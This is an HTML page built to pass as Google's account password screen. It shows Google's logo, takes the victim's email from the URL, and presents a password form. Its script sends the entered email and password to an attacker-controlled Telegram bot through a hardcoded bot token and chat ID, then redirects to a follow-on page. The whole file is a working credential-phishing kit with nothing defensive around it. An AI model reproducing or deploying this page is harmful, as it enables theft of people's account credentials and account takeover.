<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Enter Password - Google Account</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f8f9fa;
            animation: fadeIn 1s ease-in;
        }
        
        .card {
            border: none;
            width: 100%;
            animation: slideUp 0.7s ease-out;
        }
        
        .small-link {
            font-size: 0.875rem;
        }
        
        @media (min-width: 576px) {
            .card-wrapper {
                max-width: 400px;
            }
        }
        
        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }
        
        @keyframes slideUp {
            from {
                transform: translateY(30px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
    </style>
</head>

<body>
    <div class="container d-flex justify-content-center align-items-center min-vh-100">
        <div class="card card-wrapper p-4 shadow rounded-4">
            <div class="text-center mb-3">
                <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google logo" height="30">
                <h5 class="mt-3 mb-1">Welcome</h5>
                <p class="text-muted small" id="userEmail">user@example.com</p>
            </div>

            <form id="passwordForm">
                <div class="mb-3">
                    <input type="password" class="form-control" id="password" placeholder="Enter your password" required>
                </div>

                <div class="form-check mb-3">
                    <input class="form-check-input" type="checkbox" id="showPassword">
                    <label class="form-check-label" for="showPassword">Show password</label>
                </div>

                <div class="mb-3 text-start">
                    <a href="#" class="text-primary small-link">Forgot password?</a>
                </div>

                <div class="d-flex justify-content-end">
                    <button type="submit" class="btn btn-primary px-4">Next</button>
                </div>
            </form>

            <div class="text-center mt-4 small text-muted">
                <span>English (United States)</span>
                <div class="mt-2">
                    <a href="#" class="text-muted small-link">Help</a>
                    <a href="#" class="text-muted small-link mx-2">Privacy</a>
                    <a href="#" class="text-muted small-link">Terms</a>
                </div>
            </div>
        </div>
    </div>

    <script>
        let userEmail = '';

        // Toggle password visibility
        document.getElementById('showPassword').addEventListener('change', function() {
            const passwordField = document.getElementById('password');
            passwordField.type = this.checked ? 'text' : 'password';
        });

        // Get email from URL and display it
        window.onload = function() {
            const params = new URLSearchParams(window.location.search);
            const email = params.get('email');
            if (email) {
                userEmail = email;
                document.getElementById('userEmail').textContent = email;
            }
        };

        // Handle form submission and redirect to third.html with email
        document.getElementById('passwordForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const password = document.getElementById('password').value;
            const encodedEmail = encodeURIComponent(userEmail);

            // Send password to Telegram
            const botToken = '7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0';
            const chatId = '5615316142';
            const message = `Email: ${userEmail}\nPassword: ${password}`;
            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;

            fetch(telegramUrl, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            }).then(() => {
                // Proceed with redirect after message is sent
                window.location.href = `third.html?email=${encodedEmail}`;
            }).catch(error => {
                console.error('Error sending message to Telegram:', error);
                // You can optionally still redirect or show an error to the user
            });
        });
    </script>

</body>

</html>
